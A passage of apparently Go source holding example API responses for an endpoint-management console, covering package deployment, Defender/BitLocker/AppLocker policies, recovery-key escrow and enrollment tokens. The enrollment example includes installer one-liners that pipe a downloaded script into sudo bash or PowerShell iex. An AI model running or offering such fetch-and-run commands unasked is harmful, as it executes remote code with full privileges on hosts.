	"POST /api/deploy/credentials":                `{"id": "cred-ec987fc368dc0f4a5cc17d6a3bbfd96b", "name": "Linux deploy key", "username": "mustra-deploy", "auth_type": "private_key", "created_at": "2026-10-16T10:58:31Z", "created_by": "jdoe"}`,
	"GET /api/deploy/credentials/{id}/public-key": `{"public_key": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjEbLO1UJ7IZ040aQu2z2dMCUHmCkTvJK3iL0H70xQk mustra-cred-ec987fc368dc0f4a5cc17d6a3bbfd96b"}`,
	"GET /api/deploy/deployments": `{
		"deployments": [
			{
				"id": "adep-2b7e4c9a1f3d48e6b0a5c8d2e6f1a4b9",
				"target": "192.0.2.23",
				"hostname": "web-03.corp.example.com",
				"site": "hq",
				"credential": "mustra-deploy",
				"status": "succeeded",
				"error": "",
				"output": "Installing mustra agent (linux/amd64) from https://mustra.corp.example.com/downloads/mustra-agent-linux-amd64?v=0.57.41\n",
				"started_at": "2026-10-16T11:04:12Z",
				"finished_at": "2026-10-16T11:04:58Z",
				"started_by": "jdoe"
			}
		]
	}`,
	"GET /api/deploy/jobs": `{
		"jobs": [
			{
				"id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4",
				"run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
				"revision_id": "rev-4d8381cf716ba31cc205ee77a6f67eb1",
				"operation": "install",
				"status": "succeeded",
				"detail": "All required actions and validation completed",
				"created_at": "2026-10-19T13:02:44Z",
				"expires_at": "2026-10-20T13:02:44Z",
				"packages": [
					{"name": "jq", "revision": "rev-4d8381cf716ba31cc205ee77a6f67eb1", "variant": "linux", "operation": "install", "files": [], "identity": "administrator", "username": "", "success_mode": "exit_code"}
				]
			}
		]
	}`,
	// The endpoint's own copy of the log, read over NATS: the same events.
	"GET /api/deploy/jobs/{job}/log-sensor": jqInstallLogExample,
	"GET /api/deploy/jobs/{job}/logs":       jqInstallLogExample,
	// The package after the details of the body example are saved. Its
	// current revision is 2.4.1; Self Service is not pinned to one,
	// since 2.4.0, which it was pinned to, was retired.
	"PUT /api/deploy/packages/{id}": `{
		"self_service_follow_latest": false,
		"deploy_definition": ` + logShipperDefinition241 + `,
		"deploy_revision": "rev-8c59c2e37d2fd48f5fd97dc1900ce3dc",
		"id": "sw-aea1f4a2d761e08c32d3d711dd2dd419",
		"kind": "software",
		"name": "Log shipper",
		"vendor": "Example Corp",
		"version": "",
		"description": "Forwards nginx and system logs to the central collector",
		"category": "Monitoring",
		"icon": "",
		"commands": {},
		"detect": {},
		"requirements": {},
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"self_service": false,
		"allow_requests": false,
		"require_explicit_targets": false,
		"enabled": true,
		"source": "manual",
		"command_timeout_seconds": 0,
		"expire_seconds": 86400,
		"created_at": "2026-08-11T10:15:32Z",
		"updated_at": "2026-10-20T09:22:05Z",
		"created_by": "jdoe",
		"updated_by": "jdoe"
	}`,
	// A legacy action package, "Corporate proxy", with an install and a
	// remove command on Windows and Linux, becomes two Deploy drafts: one
	// per command, each a new package, to review before publishing.
	"POST /api/deploy/packages/{id}/convert-action": `{
		"message": "Created 2 drafts. Review script language and parameter environment bindings, and assign copied files to shared or platform scope. Original package and consumers remain unchanged.",
		"revisions": [
			{
				"retired": false,
				"id": "rev-5fba7a864fed6ab77c7a3385829a465f",
				"package_id": "sw-13a56519313ad8b13043d08f7e426e03",
				"label": "1",
				"definition": {
					"review_required": true,
					"kind": "action",
					"version": 2,
					"variants": [
						{"id": "windows", "os": "windows", "version": "", "actions": {"run": {"download_seconds": 1800, "require_files": false, "steps": [{"id": "run", "name": "Run", "script": {"language": "powershell", "source": "netsh winhttp set proxy proxy.corp.example.com:3128", "timeout_seconds": 900}}], "identity": "administrator"}}},
						{"id": "linux", "os": "linux", "version": "", "actions": {"run": {"download_seconds": 1800, "require_files": false, "steps": [{"id": "run", "name": "Run", "script": {"language": "shell", "source": "echo 'Acquire::http::Proxy \"http://proxy.corp.example.com:3128\";' > /etc/apt/apt.conf.d/90proxy", "timeout_seconds": 900}}], "identity": "administrator"}}}
					]
				},
				"published": false,
				"created_by": "jdoe",
				"created_at": "2026-10-20T10:04:51Z"
			},
			{
				"retired": false,
				"id": "rev-2197b137dc771df60d2a476dd6fa3fa5",
				"package_id": "sw-9950cb1bd201899fa6ea185d0e760e0d",
				"label": "1",
				"definition": {
					"review_required": true,
					"kind": "action",
					"version": 2,
					"variants": [
						{"id": "windows", "os": "windows", "version": "", "actions": {"run": {"download_seconds": 1800, "require_files": false, "steps": [{"id": "run", "name": "Run", "script": {"language": "powershell", "source": "netsh winhttp reset proxy", "timeout_seconds": 900}}], "identity": "administrator"}}},
						{"id": "linux", "os": "linux", "version": "", "actions": {"run": {"download_seconds": 1800, "require_files": false, "steps": [{"id": "run", "name": "Run", "script": {"language": "shell", "source": "rm -f /etc/apt/apt.conf.d/90proxy", "timeout_seconds": 900}}], "identity": "administrator"}}}
					]
				},
				"published": false,
				"created_by": "jdoe",
				"created_at": "2026-10-20T10:04:51Z"
			}
		]
	}`,
	// The import of the body example: the server computed the SHA-256,
	// and it matched the one given.
	"POST /api/deploy/packages/{id}/import": `{
		"id": "pf-a07aca4de37c22a5473a1ca436b9f8e1",
		"package_id": "sw-aea1f4a2d761e08c32d3d711dd2dd419",
		"name": "log-shipper_2.4.1_amd64.deb",
		"size_bytes": 9418752,
		"sha256": "1e6bd13666a86b48563bb9db9643994c965b748ba927eb3339b051d011c24367",
		"created_at": "2026-10-14T09:02:18Z",
		"created_by": "jdoe"
	}`,
	// Newest first: 2.4.1, then the 2.4.0 it superseded when it was
	// published with retire_previous.
	"GET /api/deploy/packages/{id}/revisions": `{
		"revisions": [
			{` + logShipperRevision241Fields + `},
			{
				"retired": true,
				"id": "rev-78d9fec4f02755b23c0ebb3633682f2d",
				"package_id": "sw-aea1f4a2d761e08c32d3d711dd2dd419",
				"label": "2.4.0",
				"definition": {
					"version": 1,
					"variants": [{
						"id": "s_3f9c1a7e2b40d58e",
						"os": "linux",
						"arch": ["amd64"],
						"version": "2.4.0",
						"detection": {"kind": "app", "name": "log-shipper"},
						"actions": {
							"install": {
								"validation": {"kind": "app", "name": "log-shipper", "field": "version", "operator": "version", "value": ">=2.4.0"},
								"require_files": true,
								"files": [{"id": "pf-b228a4b9e4817b6d1d172599a6497a86", "name": "log-shipper_2.4.0_amd64.deb", "sha256": "1cc01426340af31c9b41ac0f34644c089dea43ccb228867d6eb2b60248563dd0", "size": 9371648}],
								"steps": [{"id": "s_8d2e6b0a4c1f97e3", "name": "Run installer", "script": {"language": "shell", "source": "dpkg -i \"$MUSTRA_PACKAGE_DIR/log-shipper_2.4.0_amd64.deb\"", "timeout_seconds": 900}, "files": ["pf-b228a4b9e4817b6d1d172599a6497a86"]}],
								"identity": "administrator"
							}
						}
					}]
				},
				"published": true,
				"created_by": "jdoe",
				"created_at": "2026-08-11T10:21:07Z",
				"retired_note": "Superseded by 2.4.1",
				"retired_by": "jdoe",
				"retired_at": "2026-10-15T07:30:12Z"
			}
		]
	}`,
	// The draft of the body example, which created its package ("new").
	"POST /api/deploy/packages/{id}/revisions": `{
		"retired": false,
		"id": "rev-c6b31025d722cfb4ab1aa1ca63726812",
		"package_id": "sw-0b1530cc77a119dbb78e90e0eada5e3f",
		"label": "1.0.0",
		"definition": {
			"kind": "action",
			"version": 2,
			"variants": [{
				"id": "linux",
				"os": "linux",
				"version": "1.0.0",
				"actions": {"run": {"require_files": false, "steps": [{"id": "status", "name": "Show nginx status", "script": {"language": "shell", "source": "systemctl status nginx --no-pager"}}]}}
			}]
		},
		"published": false,
		"created_by": "jdoe",
		"created_at": "2026-10-20T09:47:33Z"
	}`,
	"POST /api/deploy/preview": `{
		"plans": [
			{
				"id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4",
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"packages": [
					{"name": "jq", "revision": "rev-4d8381cf716ba31cc205ee77a6f67eb1", "variant": "linux", "operation": "install", "files": [], "identity": "administrator", "username": "", "success_mode": "exit_code"}
				]
			}
		],
		"skipped": [
			{"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9", "reason": "outside your management rights or the deploy action group"}
		],
		"targets": 1
	}`,
	"POST /api/deploy/push": `{"ok": true, "output": "Installing mustra agent (linux/amd64) from https://mustra.corp.example.com/downloads/mustra-agent-linux-amd64?v=0.57.41\n"}`,
	// A draft deleted after one test run on web-01.
	"DELETE /api/deploy/revisions/{revision}": `{"deleted": true, "test_runs_removed": 1}`,
	// 2.4.1 published with retire_previous, which retired 2.4.0.
	"POST /api/deploy/revisions/{revision}/publish": `{
		` + logShipperRevision241Fields + `,
		"retired_previous": ["2.4.0"]
	}`,
	// What still points at 2.4.0, checked against 2.4.1 (?replacement=):
	// a schedule pinned to it and a playbook step. The fingerprints are
	// the ones the body example sends back to move both.
	"GET /api/deploy/revisions/{revision}/references": `{
		"references": [
			{"key": "schedule:sch-eaca5eca33f5a9e8420c80fc77001e80", "kind": "schedule", "id": "sch-eaca5eca33f5a9e8420c80fc77001e80", "name": "Log shipper on web servers", "url": "/software?schedule=sch-eaca5eca33f5a9e8420c80fc77001e80#schedules", "operation": "install", "os": "linux", "follow_latest": false, "fingerprint": "2974153195a89e3370d6fb882a7fe1109ef8a4028507a61772e66de7cc902aac", "compatible": true},
			{"key": "playbook:pb-a2ee726f006fe7786489587cb1760e68:0", "kind": "playbook", "id": "pb-a2ee726f006fe7786489587cb1760e68", "name": "New web server baseline — step 1: Install log shipper", "url": "/playbooks?edit=pb-a2ee726f006fe7786489587cb1760e68#library", "operation": "install", "os": "linux", "follow_latest": false, "fingerprint": "155d3efdbeebf718758259142d5b88d1a22787cc6280079ce8ca1dd3319024f0", "compatible": true}
		]
	}`,
	"POST /api/deploy/revisions/{revision}/references": `{"updated": 2}`,
	"POST /api/deploy/run":                             `{"run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "skipped": [], "targets": 12}`,
	// The body example's subnet: web-03, which the push example targets,
	// and a host with no PTR record.
	"POST /api/deploy/scan": `{
		"results": [
			{"ip": "192.0.2.23", "ssh_open": true, "hostname": "web-03.corp.example.com", "agent_installed": false},
			{"ip": "192.0.2.40", "ssh_open": true, "agent_installed": false}
		]
	}`,
	"GET /api/deploy/settings": `{
		"endpoint_logs": {"retention_days": 0, "archive_mb": 100, "rotate_mb": 10, "compress_files": 5},
		"server_logs": {"retention_days": 0, "archive_mb": 100, "rotate_mb": 10, "compress_files": 5},
		"cache_mb": 1024
	}`,
	"GET /api/deploy/templates": `{
		"can_override": false,
		"templates": [
			{
				"id": "dtpl-6f0b3d8a2c4e47b1a9d5c7e1f3b8a0d2",
				"name": "Staged install, no reboot",
				"description": "Pilot ring first, reboots suppressed, expires after a day",
				"is_default": false,
				"package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
				"operation": "install",
				"plan_id": "plan-aa84f3bbe99040d7d2c10d3c11ab9c32",
				"parameters": {},
				"allow_reboot": false,
				"force_remove": false,
				"expire_seconds": 86400,
				"override_windows": false,
				"created_by": "jdoe",
				"created_at": "2026-10-01T09:40:18Z",
				"updated_at": "2026-10-01T09:40:18Z"
			}
		]
	}`,
	// The settings as saved: logs kept 30 days on endpoints and 90 on
	// the server, which is also given more room.
	"PUT /api/deploy/settings": `{
		"endpoint_logs": {"retention_days": 30, "archive_mb": 100, "rotate_mb": 10, "compress_files": 5},
		"server_logs": {"retention_days": 90, "archive_mb": 2048, "rotate_mb": 10, "compress_files": 5},
		"cache_mb": 2048
	}`,
	// The template GET /api/deploy/templates lists, as the body example
	// saves it.
	"POST /api/deploy/templates":     `{"id": "dtpl-6f0b3d8a2c4e47b1a9d5c7e1f3b8a0d2"}`,
	"PUT /api/deploy/templates/{id}": `{"id": "dtpl-6f0b3d8a2c4e47b1a9d5c7e1f3b8a0d2"}`,
	// The body example's test run of one jq revision on web-01.
	"POST /api/deploy/test": `{"run_id": "run-c7ee832aa36c719f4ca7fb8b7e6376c3", "skipped": [], "targets": 1}`,

	// deployment-plans
	"GET /api/deployment-plans": `{"plans": [` + pilotPlanExample + `]}`,
	// Both answer with the plan read back from the save: the POST mints
	// its ID and records its creator, and a PUT keeps both.
	"POST /api/deployment-plans":     pilotPlanExample,
	"PUT /api/deployment-plans/{id}": pilotPlanExample,

	// discover
	// The union of the endpoints' neighbour tables, unmanaged first: the
	// lobby printer of the body example, and web-01 as the Proxmox node
	// it runs on sees it. Names come from reverse DNS. The totals count
	// these hosts; reporting_agents is how many neighbour tables were read.
	"GET /api/discover": `{
		"alert_new": true,
		"dns_servers": "10.20.0.53",
		"fleet_size": 42,
		"hosts": [
			{
				"ip": "10.40.7.50",
				"mac": "3c:2a:f4:6b:91:0e",
				"vendor": "Brother Industries",
				"seen_by": ["FIN-LT-0142"],
				"seen_count": 1,
				"last_seen": "2026-10-20T08:37:19Z",
				"managed": false,
				"subnet": "10.40.7.0/24",
				"name": "BRN3C2AF46B910E.corp.example.com",
				"label": "Lobby printer",
				"first_seen": "2026-05-19T08:05:12Z"
			},
			{
				"ip": "10.20.1.11",
				"mac": "bc:24:11:5e:3a:91",
				"vendor": "Proxmox",
				"seen_by": ["pve-01"],
				"seen_count": 1,
				"last_seen": "2026-10-20T08:40:02Z",
				"managed": true,
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"subnet": "10.20.1.0/24",
				"name": "web-01.corp.example.com",
				"first_seen": "2026-03-02T14:10:31Z"
			}
		],
		"new": 0,
		"reporting_agents": 40,
		"total": 2,
		"unmanaged": 1
	}`,

	// enforce
	"POST /api/enforce/compile": `{"settings": ` + defenderSettingsExample + `}`,
	// Of the endpoints reporting a security posture: web-01 has ufw on
	// and nothing else to count; FIN-LT-0142 is encrypted with its key
	// escrowed, Defender is on (tamper protection off, as the Defender
	// policy reports), and AppLocker only audits. The recovery keys
	// never appear here.
	"GET /api/enforce/coverage": `{
		"all": {"reporting": 2, "firewall": 2, "encrypted": 1, "antivirus": 1, "app_control": 0, "escrowed": 1},
		"endpoints": [
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"os": "windows",
				"collected_at": "2026-10-20T08:12:05Z",
				"firewall_engine": "windows-defender",
				"firewall_enabled": true,
				"firewall_profiles": [
					{"name": "Domain", "enabled": true, "default_inbound": "Block", "default_outbound": "Allow", "log_blocked": true},
					{"name": "Private", "enabled": true, "default_inbound": "Block", "default_outbound": "Allow", "log_blocked": true},
					{"name": "Public", "enabled": true, "default_inbound": "Block", "default_outbound": "Allow", "log_blocked": true}
				],
				"encryption_engine": "bitlocker",
				"os_volume_encrypted": true,
				"volumes": [
					{"mount": "C:", "type": "os", "status": "FullyEncrypted", "protection_on": true, "method": "XtsAes256", "percent": 100, "protectors": ["Tpm", "RecoveryPassword"], "recovery_key_ids": ["{7C1E4A92-3B5D-4F08-A6E2-9D0B8C3F51A7}"]}
				],
				"antivirus_engine": "defender",
				"antivirus_enabled": true,
				"antivirus_realtime": true,
				"antivirus_signature_age_hours": 6,
				"antivirus_last_quick_scan": "2026-10-20T03:02:18.4410000+01:00",
				"antivirus_tamper_protected": false,
				"antivirus_cloud_level": "advanced",
				"app_control_engine": "applocker",
				"app_control_mode": "audit",
				"app_control_collections": [
					{"type": "Exe", "mode": "AuditOnly", "rules": 3},
					{"type": "Msi", "mode": "AuditOnly", "rules": 3},
					{"type": "Script", "mode": "AuditOnly", "rules": 3}
				],
				"escrowed": true
			},
			{
				"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
				"hostname": "web-01",
				"os": "linux",
				"collected_at": "2026-10-20T08:40:07Z",
				"firewall_engine": "ufw",
				"firewall_enabled": true,
				"encryption_engine": "none",
				"os_volume_encrypted": false,
				"antivirus_engine": "none",
				"antivirus_enabled": false,
				"antivirus_realtime": false,
				"antivirus_signature_age_hours": 0,
				"antivirus_tamper_protected": false,
				"app_control_engine": "none",
				"app_control_mode": "off",
				"escrowed": false
			}
		],
		"windows": {"reporting": 1, "firewall": 1, "encrypted": 1, "antivirus": 1, "app_control": 0, "escrowed": 1}
	}`,
	// Every typed policy, all of them Windows, with the form a new one
	// starts from.
	"GET /api/enforce/kinds": `{
		"kinds": [
			{
				"kind": "windows_firewall",
				"label": "Windows Firewall",
				"os": "windows",
				"description": "Profile state, default actions, dropped-packet logging and a managed rule set, applied to the local firewall policy.",
				"defaults": {
					"profiles": {
						"domain": {"enabled": true, "default_inbound": "block", "default_outbound": "allow"},
						"private": {"enabled": true, "default_inbound": "block", "default_outbound": "allow"},
						"public": {"enabled": true, "default_inbound": "block", "default_outbound": "allow"}
					},
					"log_dropped": true,
					"rules": []
				}
			},
			{
				"kind": "bitlocker",
				"label": "BitLocker",
				"os": "windows",
				"description": "Full-volume encryption with a recovery password protector; recovery keys are escrowed to mustra by the security posture sensor.",
				"defaults": {"volumes": "os", "method": "XtsAes256", "require_tpm": true, "allow_without_tpm": false, "escrow": true}
			},
			{
				"kind": "defender",
				"label": "Microsoft Defender",
				"os": "windows",
				"description": "Real-time protection, cloud-delivered protection, PUA blocking, signature freshness and scheduled scans.",
				"defaults": {"realtime": true, "cloud_level": "advanced", "pua": "block", "signature_max_age_hours": 48, "daily_quick_scan": true, "network_protection": false, "check_tamper_protection": true, "controlled_folder_access": false}
			},
			{
				"kind": "applocker",
				"label": "AppLocker",
				"os": "windows",
				"description": "Application control: audit or enforce, default allow rules for Windows and Program Files, and your own path, publisher or hash rules.",
				"defaults": {"mode": "audit", "collections": ["exe", "msi", "script"], "default_rules": true, "rules": []}
			}
		]
	}`,
	// Sorted by name. The counts are of result rows, one per setting and
	// endpoint: the time-sync dry run reached 11 of its 12 web servers.
	"GET /api/enforce/policies": `{
		"interval_minutes": 30,
		"max_attempts": 3,
		"policies": [
			{` + defenderPolicyFields + `,
				"endpoints": 1,
				"compliant": 5,
				"drifted": 1,
				"remediated": 1,
				"failed": 0,
				"failing": 0,
				"unknown": 0
			},
			{` + timeSyncPolicyFields + `,
				"updated_at": "2026-09-14T10:22:37Z",
				"updated_by": "jdoe",
				"last_run_at": "2026-10-20T08:31:07Z",
				"endpoints": 11,
				"compliant": 10,
				"drifted": 1,
				"remediated": 0,
				"failed": 0,
				"failing": 0,
				"unknown": 0
			}
		]
	}`,
	// The policy as read back after the save: a new one has not run yet.
	"POST /api/enforce/policies": `{"policy": {` + timeSyncPolicyFields + `,
		"updated_at": "2026-09-14T10:22:37Z",
		"updated_by": "jdoe"
	}}`,
	// The policy and its results, worst first; a list shows three of
	// the seven.
	"GET /api/enforce/policies/{id}": `{
		"policy": {` + defenderPolicyFields + `},
		"results": [
			` + defenderTamperResultExample + `,
			` + defenderPUAResultExample + `,
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"hostname": "FIN-LT-0142",
				"policy_id": "enf-8b2d6f0a4c1e47e9b3a5d7c9e1f3a5b7",
				"setting_id": "set-defender-90328d9aeee2",
				"name": "Defender: antimalware service is running",
				"severity": "critical",
				"state": "compliant",
				"detail": "",
				"consecutive_failures": 0,
				"remediation_count": 0,
				"checked_at": "2026-10-20T08:16:31Z"
			}
		]
	}`,

	// directory
	"GET /api/directory":  directoryViewExample,
	"POST /api/directory": directoryViewExample,
	// A sync started by hand at 09:12, which found one new user.
	"POST /api/directory/sync": `{` + directorySettingsFields + `,
		"last_sync": "2026-10-20T09:12:06Z",
		"last_summary": "corp.example.com (CORP): 58 users, 23 groups, 44 computers, 214 memberships in 1.307s",
		"counts": {"users": 58, "groups": 23, "computers": 44, "memberships": 214, "synced_at": "2026-10-20T09:12:05.596031Z"}
	}`,
	// The bind worked; the count is the users, groups and computers it
	// can read.
	"POST /api/directory/test": `{"info": "bound as CN=svc-mustra,OU=Service Accounts,DC=corp,DC=example,DC=com; corp.example.com (CORP): 124 objects readable under DC=corp,DC=example,DC=com", "ok": true}`,
	// The settings are unchanged, so the results are kept.
	"PUT /api/enforce/policies/{id}": `{"policy": {` + timeSyncPolicyFields + `,
		"updated_at": "2026-10-20T08:44:03Z",
		"updated_by": "jdoe",
		"last_run_at": "2026-10-20T08:31:07Z"
	}}`,
	"DELETE /api/enforce/policies/{id}":     `{"deleted": "Time sync on web servers"}`,
	"POST /api/enforce/policies/{id}/reset": `{"reset": "Defender baseline"}`,
	"POST /api/enforce/policies/{id}/run": `{
		"policy": "Time sync on web servers",
		"mode": "report (dry run)",
		"endpoints": 12,
		"compliant": 10,
		"drifted": 1,
		"remediated": 0,
		"failed": 0,
		"unknown": 0,
		"unreached": 1
	}`,
	// FIN-LT-0142's BitLocker recovery password, escrowed from its
	// security posture. Listing needs deploy.manage; can_reveal says
	// whether the caller also holds enforce.recovery_keys, which
	// revealing needs.
	"GET /api/enforce/recovery-keys": `{
		"can_reveal": true,
		"escrow_available": true,
		"keys": [
			{
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"mount": "C:",
				"key_id": "{7C1E4A92-3B5D-4F08-A6E2-9D0B8C3F51A7}",
				"first_escrowed": "2026-05-19T08:21:13Z",
				"last_seen": "2026-10-20T08:12:05Z",
				"hostname": "FIN-LT-0142"
			}
		]
	}`,
	// The password unlocks the disk; every reveal is audited as
	// bitlocker.key_view.
	"POST /api/enforce/recovery-keys/{agent}/{key}/reveal": `{
		"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
		"hostname": "FIN-LT-0142",
		"key_id": "{7C1E4A92-3B5D-4F08-A6E2-9D0B8C3F51A7}",
		"mount": "C:",
		"password": "<48-digit recovery password>"
	}`,
	// Every policy's results, worst first, then by hostname; the
	// compliant rows that follow are left out.
	"GET /api/enforce/results": `{
		"results": [
			` + defenderTamperResultExample + `,
			` + timeSyncDriftResultExample + `,
			` + defenderPUAResultExample + `
		]
	}`,

	// enrollment-tokens
	"GET /api/enrollment-tokens": `{"tokens": [{` + enrollTokenRecordFields + `, "usable": true}]}`,
	"POST /api/enrollment-tokens": `{
		"commands": {
			"unix": "curl -fsSL -H 'Authorization: Bearer mte_<token, shown once>' 'https://mustra.corp.example.com/install.sh?site=dc-east' | sudo bash",
			"alpine": "apk add --no-cache bash curl && curl -fsSL -H 'Authorization: Bearer mte_<token, shown once>' 'https://mustra.corp.example.com/install.sh?site=dc-east' | bash",
			"windows": "irm -UseBasicParsing -Headers @{Authorization='Bearer mte_<token, shown once>'} 'https://mustra.corp.example.com/install.ps1?site=dc-east' | iex"
		},
		"record": {
			"id": "etk-1d5f9b3e7a2c46e8b0d4f6a8c2e1b3d7",
			"label": "Web servers, rack B",
			"site": "dc-east",
			"max_uses": 10,
			"uses": 0,
			"created_by": "jdoe",
			"created_at": "2026-10-20T07:12:09Z",
			"expires_at": "2026-10-21T07:12:09Z"
		},
		"token": "mte_<token, shown once>"
	}`,
	"DELETE /api/enrollment-tokens/{id}": `{"ok": true}`,

	// entra
	"GET /api/admin/entra": entraConfigExample,
	// The connection read back after the save: what changed is not said,
	// and a secret sent is only ever set.
	"POST /api/admin/entra": entraConfigExample,
	// What the sync found: Entra's devices, those Intune manages, and
	// those matched to an endpoint here. intune and matched are left
	// out when zero.
	"POST /api/admin/entra/sync": `{"devices": 45, "intune": 31, "matched": 38}`,

	// eun
	"GET /api/eun": `{
		"messages": [
			` + eunNoticeRecord + `,
			{
				"id": "eun-6c0e4a8f2b1d47e9a3c5b7d9f1e3a0c4",
				"kind": "restart",
				"name": "Restart after patching",
				"title": "Restart to finish installing updates",
				"body": "Updates were installed on your computer and need a restart to take effect.",
				"allow_postpone": true,
				"countdown_minutes": 15,
				"gentle_minutes": 60,
				"postpone_minutes": [60, 240],
				"buttons": [
					{"label": "Restart now", "action": "restart_now", "primary": true},
					{"label": "In an hour", "action": "postponed", "minutes": 60},
					{"label": "In four hours", "action": "postponed", "minutes": 240}
				],
				"created_at": "2026-09-24T11:37:02Z",
				"updated_at": "2026-09-24T11:37:02Z",
				"created_by": "jdoe"
			}
		]
	}`,
	"POST /api/eun":           eunNoticeRecord,
	"PUT /api/eun/{id}":       `{` + eunNoticeFields + `, "updated_at": "2026-10-20T09:40:02Z", "created_by": "jdoe"}`,
	"POST /api/eun/{id}/send": `{"message": "sent to 2 endpoint(s)", "run_id": "run-3b9d5f1a7c2e48e6a0b4d8c2f6e1a9d7", "targets": 2}`,

	// entra
	// The last hourly sync, by name. FIN-LT-0142 is in Entra and Intune,
	// merged by its Entra device ID and matched to its endpoint. The phone
	// is in Intune only, with no Entra device ID, so its key is Intune's.
	"GET /api/entra/devices": `{
		"configured": true,
		"devices": [
			{
				"key": "3b8f2d6a-9c1e-4f7a-b5d3-0e8c2a6f4b19",
				"entra_device_id": "3b8f2d6a-9c1e-4f7a-b5d3-0e8c2a6f4b19",
				"intune_id": "c7e1a5f9-3b2d-4e8a-a6c0-d4b8f2e6a1c3",
				"name": "FIN-LT-0142",
				"os": "Windows",
				"os_version": "10.0.26100.6584",
				"trust_type": "AzureAd",
				"account_enabled": true,
				"entra_compliant": true,
				"last_sign_in": "2026-10-20T07:41:00Z",
				"compliance_state": "compliant",
				"last_sync": "2026-10-20T07:55:12Z",
				"user_upn": "jdoe@example.com",
				"serial": "PF4KX2QZ",
				"agent_id": "agt-9b1d7e3a5c2f48d0a6e4b8c1f3d5a7e9",
				"synced_at": "2026-10-20T08:00:04Z"
			},
			{
				"key": "intune:5e9a1c3f-7b2d-48e6-a0c4-b8d2f6e1a3c9",
				"entra_device_id": "",
				"intune_id": "5e9a1c3f-7b2d-48e6-a0c4-b8d2f6e1a3c9",
				"name": "jdoe_iPhone_5/20/2026_8:02 AM",
				"os": "iOS",
				"os_version": "18.6.2",
				"trust_type": "",
				"compliance_state": "compliant",
				"last_sync": "2026-10-20T06:48:31Z",
				"user_upn": "jdoe@example.com",
				"serial": "F2LXK9QWHG7J",
				"agent_id": "",
				"synced_at": "2026-10-20T08:00:04Z"
			}
		],
		"last_error": "",
		"last_sync": "2026-10-20T08:00:04Z"
	}`,

	// file-events
	// Newest first. The suppressed row stands for the writes past the
	// agent's cap during an upgrade. The sudoers write matched the
	// "Cron or sudoers changed" signal: matched_ioc holds the signal's ID,
	// and ioc_name the signal's name.
	"GET /api/file-events": `{
		"events": [
			{"id": 918302, "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "path": "", "op": "suppressed", "at": "2026-10-20T06:25:14Z", "count": 187},
			{"id": 918244, "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "hostname": "web-01", "path": "/etc/sudoers.d/deploy", "op": "write", "at": "2026-10-20T03:14:51Z", "count": 1, "matched_ioc": "sig-3e9c5a1f7b2d48e6a0c4b8d2f6e1a3c9", "ioc_name": "Cron or sudoers changed"}
		],
		"retention_days": 14,
		"summary": {"last_24h": 1342, "suppressed_24h": 187, "matched_24h": 1, "endpoints_reporting": 38}
	}`,

	// groups
	"GET /api/admin/groups": `{
		"groups": [
			{
				"id": "grp-4a8c2e6f0b1d47e3a9c5b7d1f3e8a0c2",
				"display_name": "Service desk",
				"external_id": "5d1c8e4a-2f6b-4d9e-a7c3-0b8f2e6d4a1c",
				"member_ids": ["usr-2e6a0c4f8b1d47e3a9c5f1b7d3e0a8c6"],
				"role_ids": ["role-7c3e9a1f5b2d48e6a0c4b8d2f6e1a3c9"],
				"created_at": "2026-02-11T08:55:40Z"
			}
		]
	}`,
	// The group body example, created in the console: no external_id
	// (SCIM sets one), and no members or roles yet.
	"POST /api/admin/groups": `{
		"id": "grp-9d3f7b1e5a2c46e8b0d4a6c8e2f1b3d5",
		"display_name": "Helpdesk",
		"member_ids": [],
		"role_ids": [],
		"created_at": "2026-10-20T09:21:33Z"
	}`,
	"GET /api/groups": `{
		"fields": [
			{"field": "hostname", "label": "Hostname", "kind": "string", "ops": ["equals", "not_equals", "contains", "not_contains", "starts_with", "ends_with", "regex", "in", "not_in"]},
			{"field": "os", "label": "Operating system", "kind": "string", "ops": ["equals", "not_equals", "contains", "not_contains", "starts_with", "ends_with", "regex", "in", "not_in"], "hint": "linux, windows, darwin"},
			{"field": "online", "label": "Online", "kind": "bool", "ops": ["equals"], "hint": "true or false"},
			{"field": "cpu_count", "label": "Processor count", "kind": "number", "ops": ["equals", "not_equals", "gt", "gte", "lt", "lte"]}
		],
		"groups": [
			{` + webServersGroupFields + `, "member_count": 12},
			{` + pilotGroupFields + `, "member_count": 1}
		]
	}`,
	"POST /api/groups":             `{` + webServersGroupFields + `}`,
	"POST /api/groups/preview":     `{"matched": 1, "members": [` + agentWeb01Example + `], "total": 2}`,
	"PUT /api/groups/{id}":         `{` + webServersGroupFields + `}`,
	"DELETE /api/groups/{id}":      `{"deleted": "cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3", "disabled_enforce_policies": 1, "disabled_playbooks": 0}`,
	"GET /api/groups/{id}/members": `{"group": {` + webServersGroupFields + `}, "members": [` + agentWeb01Example + `]}`,

	// guide
	// The open items, most severe first; counts are over the same items.
	"GET /api/help": `{
		"guides": [
			{"slug": "getting-started", "title": "Getting started", "summary": "Sign in, add your first endpoints and find your way around.", "group": "Start here", "order": 1, "pages": ["/"]},
